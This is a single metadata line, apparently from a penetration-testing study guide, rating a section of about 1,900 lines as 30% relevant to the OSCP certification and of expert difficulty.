**Total Lines**: ~1,900 lines | **OSCP Relevance**: MEDIUM (30%) | **Difficulty**: Expert
